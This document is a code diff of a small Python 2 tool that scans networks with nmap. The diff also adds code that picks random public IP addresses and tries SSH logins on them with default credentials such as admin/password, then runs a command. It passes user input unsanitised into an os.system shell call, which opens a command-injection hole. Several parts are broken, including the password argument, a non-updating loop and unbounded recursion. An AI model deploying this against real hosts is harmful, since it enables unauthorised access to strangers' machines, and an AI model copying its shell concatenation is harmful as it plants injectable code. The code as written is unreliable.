@@ -1,30 +1,75 @@
 # -*- coding: utf-8 -*-
-import socket, nmap
+import socket
+import nmap
+import random
+import os
+import paramiko
+import re
+
+
+default = [("ubuntu", ""), ("admin", "password")]
 
 
 def menu():
     return """1. Get IPs list.
-    2. Get information about a device.
-    3. Tunnel through device.
-    4. Exit.
-    (1/2/3/4)
-    """
+2. Get information about a device.
+3. Tunnel through device.
+4. Exit.
+(1/2/3/4)
+"""
 
 
 def get_list():
-    return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")]
+    nm = nmap.PortScanner()
+    nm.scan()
+    return nm.all_hosts()
 
 
-#def Get_Info():
+def get_info():
+    ip = raw_input("Insert ip: ")
+    return os.system('nmap -O -Pn ' + ip)
 
 
-#def Tunnel():
+def generate_ip():
+    str_ip = "77."
+    int_ip = random.randint(124, 127)
+    str_ip += str(int_ip) + '.'
+    int_ip = random.randint(0, 255)
+    str_ip += str(int_ip) + '.'
+    int_ip = random.randint(0, 255)
+    str_ip += str(int_ip)
+    print str_ip
+    return str_ip
+
+
+def init_tunnel():
+    ssh = paramiko.SSHClient()
+    pat = re.compile("Linux")
+    ip = generate_ip()
+    ops = os.system('nmap -O -Pn ' + ip)
+    while re.search(pat, str(ops)) != None:
+        ip = generate_ip()
+    tunnel(ssh, ip)
+    ssh.close()
+
+
+def tunnel(client, ip):
+    try:
+        client.connect(ip, port=22, username=default[0][0], password=[0][0])
+        stdin, stdout, stderr = client.exec_command('ls')
+        print stdout
+        print "Connection successful"
+    except socket.error:
+        tunnel(client, ip)
 
 
 def handle(ans, client):
     if ans == 1:
-        print ', '.join(get_list())
-
+        print get_list()
+    if ans == 2:
+        print get_info()
+    if ans == 3:
+        init_tunnel()
 
 
 def check(ans):
